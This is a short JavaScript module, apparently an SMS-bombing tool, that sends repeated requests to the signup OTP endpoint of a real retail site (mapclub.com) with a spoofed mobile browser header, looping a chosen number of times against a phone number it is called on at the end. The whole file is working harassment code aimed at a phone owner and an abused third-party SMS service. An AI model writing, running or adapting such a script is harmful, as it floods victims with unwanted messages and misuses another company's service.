const { default: Axios } = require('axios')

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))

function send_sms(number, count, delayna = 0) {
     return new Promise(async (resolve, reject) => {
          for (let i = 0;i <= Number(count);i++) {
               Axios.post('https://cmsapi.mapclub.com/api/signup-otp', JSON.stringify({
                    phone: number
               }), {
                    headers: {
                         'User-agent': 'Mozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
                         'Referer': 'https://www.mapclub.com/en/user/signup',
                         'Content-Type': 'application/json'
                    }
               })
                    .then(({ data }) => resolve(data))
                    .catch(e => reject(e.response.data))
               await delay(Number(delayna))
               // console.log(i);
          }
     })
}

module.exports = send_sms
 send_sms('6285559038021', 1, 1000)
      .then(console.log)
      .catch(console.log)